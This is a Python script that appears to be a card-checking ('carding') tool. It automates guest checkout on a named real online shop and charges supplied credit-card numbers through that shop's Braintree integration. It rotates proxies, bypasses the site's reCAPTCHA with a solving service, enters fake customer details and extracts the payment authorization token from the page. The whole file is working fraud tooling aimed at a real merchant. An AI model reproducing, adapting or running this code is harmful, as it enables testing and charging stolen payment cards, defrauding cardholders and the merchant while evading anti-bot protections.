import requests,re,base64,random,uuid,string
from capsolv import solve_recaptcha
from proxy import proxies
def email_generator():
    dominio = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    longitud = random.randint(8, 12)
    usuario = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(longitud))
    correo = usuario + '@' + random.choice(dominio)
    return correo

async def b3_charge(cc,mm,yy,cvv):
    proxy = proxies()
    r = requests.Session()
    r.proxies = proxy
    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.bisounyc.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.bisounyc.com/index.php?route=product/product&path=84_87&product_id=2281',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }
    params = (
    ('route', 'checkout/cart/add'),
    )
    data = {
  'option[2303]': '11896',
  'quantity': '1',
  'product_id': '2281'
    }
    try:
        response = r.post('https://www.bisounyc.com/index.php', headers=headers, params=params, data=data)
        cookies_dict = response.cookies.get_dict()
        phpsessid = cookies_dict['PHPSESSID']
    except Exception as e:
        return "Error in 1st Req"
    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'cookie': f'PHPSESSID={phpsessid}; language=en; currency=USD; _ga=GA1.2.1940507215.1726730767; _gid=GA1.2.1101270908.1726730767; _clck=1koidg1%7C2%7Cfpb%7C0%7C1723; _tccl_visitor=10bf1a7c-f273-434d-a5bd-438495ab0079; _tccl_visit=10bf1a7c-f273-434d-a5bd-438495ab0079; __zlcmid=1Npn20OQ5Yc2ew9; viewed=2281; _scc_session=pc=5&C_TOUCH=2024-09-19T07:27:48.490Z; _ga_9BSEFHNG7X=GS1.2.1726730767.1.1.1726730868.60.0.0; _clsk=1nxvfbg%7C1726730868803%7C5%7C1%7Cw.clarity.ms%2Fcollect',
    'pragma': 'no-cache',
    'priority': 'u=0, i',
    'referer': 'https://www.bisounyc.com/index.php?route=checkout/cart',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    }

    params = (
    ('route', 'checkout/checkout'),
    )
    try:
        response = r.get('https://www.bisounyc.com/index.php', headers=headers, params=params)
    except:
        return "Error in 2nd Req"
    headers = {
    'accept': 'text/html, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'cookie': f'PHPSESSID={phpsessid}; language=en; currency=USD; _ga=GA1.2.1940507215.1726730767; _gid=GA1.2.1101270908.1726730767; _clck=1koidg1%7C2%7Cfpb%7C0%7C1723; _tccl_visitor=10bf1a7c-f273-434d-a5bd-438495ab0079; _tccl_visit=10bf1a7c-f273-434d-a5bd-438495ab0079; __zlcmid=1Npn20OQ5Yc2ew9; viewed=2281; _scc_session=pc=6&C_TOUCH=2024-09-19T07:30:01.960Z; _ga_9BSEFHNG7X=GS1.2.1726730767.1.1.1726731002.60.0.0; _clsk=1nxvfbg%7C1726731002594%7C6%7C1%7Cw.clarity.ms%2Fcollect',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.bisounyc.com/index.php?route=checkout/checkout',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

    params = (
    ('route', 'checkout/guest'),
    )
    try:
        response = r.get('https://www.bisounyc.com/index.php', headers=headers, params=params)
    except:
        return "Error in 3rd Req"
    
    try:
        recap = await solve_recaptcha('https://www.bisounyc.com/index.php?route=checkout/checkout', '6LcTuRETAAAAAI8UM-OZi42uzV4eskYcMePUt09f')
    except:
        return "Error in Captcha"
    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie': f'PHPSESSID={phpsessid}; language=en; currency=USD; _ga=GA1.2.1940507215.1726730767; _gid=GA1.2.1101270908.1726730767; _clck=1koidg1%7C2%7Cfpb%7C0%7C1723; _tccl_visitor=10bf1a7c-f273-434d-a5bd-438495ab0079; _tccl_visit=10bf1a7c-f273-434d-a5bd-438495ab0079; __zlcmid=1Npn20OQ5Yc2ew9; viewed=2281; _scc_session=pc=6&C_TOUCH=2024-09-19T07:30:01.960Z; _ga_9BSEFHNG7X=GS1.2.1726730767.1.1.1726731002.60.0.0; _clsk=1nxvfbg%7C1726731002594%7C6%7C1%7Cw.clarity.ms%2Fcollect',
    'origin': 'https://www.bisounyc.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.bisounyc.com/index.php?route=checkout/checkout',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }
    params = (
    ('route', 'checkout/guest/save'),
    )
    data = {
    'customer_group_id': '1',
    'firstname': 'Albedo',
    'lastname': 'Jones',
    'email': 'Korey.HEESEN@7example.com',
    'telephone': '8968558596',
    'company': '',
    'address_1': 'New York',
    'address_2': '',
    'city': 'New York',
    'postcode': '10080',
    'country_id': '223',
    'zone_id': '3655',
    'g-recaptcha-response': recap,
    'shipping_address': '1',
    }
    response = r.post('https://www.bisounyc.com/index.php', headers=headers, params=params, data=data)

    headers = {
    'accept': 'text/html, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'cookie': f'PHPSESSID={phpsessid}; language=en; currency=USD; _ga=GA1.2.1940507215.1726730767; _gid=GA1.2.1101270908.1726730767; _clck=1koidg1%7C2%7Cfpb%7C0%7C1723; _tccl_visitor=10bf1a7c-f273-434d-a5bd-438495ab0079; _tccl_visit=10bf1a7c-f273-434d-a5bd-438495ab0079; __zlcmid=1Npn20OQ5Yc2ew9; viewed=2281; _scc_session=pc=6&C_TOUCH=2024-09-19T07:30:01.960Z; _ga_9BSEFHNG7X=GS1.2.1726730767.1.1.1726731002.60.0.0; _clsk=1nxvfbg%7C1726731002594%7C6%7C1%7Cw.clarity.ms%2Fcollect',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': 'https://www.bisounyc.com/index.php?route=checkout/checkout',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }
    params = (
    ('route', 'checkout/shipping_method'),
    )
    response = r.get('https://www.bisounyc.com/index.php', headers=headers, params=params)
    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie': f'PHPSESSID={phpsessid}; language=en; currency=USD; _ga=GA1.2.1940507215.1726730767; _gid=GA1.2.1101270908.1726730767; _clck=1koidg1%7C2%7Cfpb%7C0%7C1723; _tccl_visitor=10bf1a7c-f273-434d-a5bd-438495ab0079; _tccl_visit=10bf1a7c-f273-434d-a5bd-438495ab0079; __zlcmid=1Npn20OQ5Yc2ew9; viewed=2281; _scc_session=pc=6&C_TOUCH=2024-09-19T07:30:01.960Z; _ga_9BSEFHNG7X=GS1.2.1726730767.1.1.1726731002.60.0.0; _clsk=1nxvfbg%7C1726731002594%7C6%7C1%7Cw.clarity.ms%2Fcollect',
    'origin': 'https://www.bisounyc.com',
    'priority': 'u=1, i',
    'referer': 'https://www.bisounyc.com/index.php?route=checkout/checkout',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = (
    ('route', 'checkout/shipping_method/save'),
)

    data = {
  'shipping_method': 'customshipping.customshipping0',
  'comment': ''
}

    response = r.post('https://www.bisounyc.com/index.php', headers=headers, params=params, data=data, proxies=proxy)

    headers = {
    'accept': 'text/html, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'cookie': f'PHPSESSID={phpsessid}; language=en; currency=USD; _ga=GA1.2.1940507215.1726730767; _gid=GA1.2.1101270908.1726730767; _clck=1koidg1%7C2%7Cfpb%7C0%7C1723; _tccl_visitor=10bf1a7c-f273-434d-a5bd-438495ab0079; _tccl_visit=10bf1a7c-f273-434d-a5bd-438495ab0079; __zlcmid=1Npn20OQ5Yc2ew9; viewed=2281; _scc_session=pc=6&C_TOUCH=2024-09-19T07:30:01.960Z; _ga_9BSEFHNG7X=GS1.2.1726730767.1.1.1726731002.60.0.0; _clsk=1nxvfbg%7C1726731002594%7C6%7C1%7Cw.clarity.ms%2Fcollect',
    'priority': 'u=1, i',
    'referer': 'https://www.bisounyc.com/index.php?route=checkout/checkout',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = (
    ('route', 'checkout/payment_method'),
)

    response = r.get('https://www.bisounyc.com/index.php', headers=headers, params=params, proxies=proxy)

    headers = {
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie': f'PHPSESSID={phpsessid}; language=en; currency=USD; _ga=GA1.2.1940507215.1726730767; _gid=GA1.2.1101270908.1726730767; _clck=1koidg1%7C2%7Cfpb%7C0%7C1723; _tccl_visitor=10bf1a7c-f273-434d-a5bd-438495ab0079; _tccl_visit=10bf1a7c-f273-434d-a5bd-438495ab0079; __zlcmid=1Npn20OQ5Yc2ew9; viewed=2281; _scc_session=pc=6&C_TOUCH=2024-09-19T07:30:01.960Z; _ga_9BSEFHNG7X=GS1.2.1726730767.1.1.1726731002.60.0.0; _clsk=1nxvfbg%7C1726731002594%7C6%7C1%7Cw.clarity.ms%2Fcollect',
    'origin': 'https://www.bisounyc.com',
    'priority': 'u=1, i',
    'referer': 'https://www.bisounyc.com/index.php?route=checkout/checkout',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = (
    ('route', 'checkout/payment_method/save'),
)

    data = {
  'payment_method': 'braintree',
  'comment': '',
  'agree': '1'
}

    response = r.post('https://www.bisounyc.com/index.php', headers=headers, params=params, data=data)

    headers = {
    'accept': 'text/html, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'cookie': f'PHPSESSID={phpsessid}; language=en; currency=USD; _ga=GA1.2.1940507215.1726730767; _gid=GA1.2.1101270908.1726730767; _clck=1koidg1%7C2%7Cfpb%7C0%7C1723; _tccl_visitor=10bf1a7c-f273-434d-a5bd-438495ab0079; _tccl_visit=10bf1a7c-f273-434d-a5bd-438495ab0079; __zlcmid=1Npn20OQ5Yc2ew9; viewed=2281; _scc_session=pc=6&C_TOUCH=2024-09-19T07:30:01.960Z; _ga_9BSEFHNG7X=GS1.2.1726730767.1.1.1726731002.60.0.0; _clsk=1nxvfbg%7C1726731002594%7C6%7C1%7Cw.clarity.ms%2Fcollect',
    'priority': 'u=1, i',
    'referer': 'https://www.bisounyc.com/index.php?route=checkout/checkout',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    params = (
    ('route', 'checkout/confirm'),
    )

    response = r.get('https://www.bisounyc.com/index.php', headers=headers, params=params, proxies=proxy)
    client_token = re.findall(r"authorization: '(.*?)'", response.text)[0]
    decode = base64.b64decode(client_token).decode('utf-8')
    at = re.findall(r'authorizationFingerprint":"(.*?)"', decode)[0]
    mr = re.findall(r'merchantId":"(.*?)"', decode)[0]

    headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}

    json_data = {
    '_meta': {
        'merchantAppId': 'www.bisounyc.com',
        'platform': 'web',
        'sdkVersion': '3.27.0',
        'source': 'hosted-fields',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': str(uuid.uuid4()),
    },
    'creditCard': {
        'number': cc,
        'cvv': cvv,
        'expiration_month': mm,
        'expiration_year': yy,
        'options': {
            'validate': False,
        },
    },
    'braintreeLibraryVersion': 'braintree/web/3.27.0',
    'authorizationFingerprint': at,
}
    response = r.post(
    'https://api.braintreegateway.com/merchants/wbqkbf87hwtvdxqt/client_api/v1/payment_methods/credit_cards',
    headers=headers,
    json=json_data,
    proxies=proxy
    )
    token = re.findall(r'"nonce":"(.*?)"', response.text)[0]
    cookies = {
    'PHPSESSID':  f'{phpsessid}',
    'language': 'en',
    'currency': 'USD',
    '_ga': 'GA1.2.1940507215.1726730767',
    '_gid': 'GA1.2.1101270908.1726730767',
    '_clck': '1koidg1%7C2%7Cfpb%7C0%7C1723',
    '_tccl_visitor': '10bf1a7c-f273-434d-a5bd-438495ab0079',
    '_tccl_visit': '10bf1a7c-f273-434d-a5bd-438495ab0079',
    '__zlcmid': '1Npn20OQ5Yc2ew9',
    'viewed': '2281',
    '_ga_9BSEFHNG7X': 'GS1.2.1726730767.1.1.1726731002.60.0.0',
    '_scc_session': 'pc=1&C_TOUCH=2024-09-19T07:53:10.371Z',
    '_clsk': '1nxvfbg%7C1726732391439%7C7%7C1%7Cw.clarity.ms%2Fcollect',
}

    headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.bisounyc.com',
    'priority': 'u=1, i',
    'referer': 'https://www.bisounyc.com/index.php?route=checkout/checkout',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'nonce': token,
    'token': '',
    'payment_type': 'new_card',
    'store_card': 'false',
    'device_data': '',
}   
    response = r.post('https://www.bisounyc.com/index.php?route=extension/payment/braintree/chargeNonce',cookies=cookies,headers=headers,data=data)
    if response.status_code == 200:
        return response.text if response.text != '' else 'Your Order has been placed successfully'
    else:
        return ""

        

